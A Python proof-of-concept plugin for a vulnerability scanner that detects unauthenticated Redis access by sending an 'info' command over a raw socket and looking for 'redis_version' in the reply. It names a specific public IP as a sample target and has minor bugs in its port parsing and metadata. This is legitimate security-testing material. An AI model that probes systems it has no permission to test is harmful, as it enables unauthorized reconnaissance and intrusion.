#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : jeffzhang
# @Time    : 2018/12/26
# @File    : 170815_redis_all_unauthorized.py
# @Desc    : ""


import socket
from alioth.lib.core.poc import BasePoC, Output


class RedisUnAuth(BasePoC):
    pid = 'test'
    name = 'redis 未授权访问漏洞'
    author = 'jeffzhang'
    app = 'redis'
    version = '1.0.0'
    v_type = 'unauthorized',
    desc = 'test desc',
    date = '2018/12/26',
    samples = ['139.199.127.43']

    def _verify(self):
        result = {}
        payload = b"\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a"
        s = socket.socket()
        socket.setdefaulttimeout(4)
        try:
            host = self.target.strip('/').split(':')
            if len(host) > 2:
                port = int(host[-1])
            else:
                port = 6379
            host = host[0]
            s.connect((host, port))
            s.send(payload)
            data = s.recv(1024).decode()
            if data and 'redis_version' in data:
                result['target'] = self.target
                result['port'] = port
                result['result'] = data[:20]
        except Exception as e:
            self.error = e
        s.close()
        return self.parse_result(result)

    def parse_result(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail(self.error)
        return output
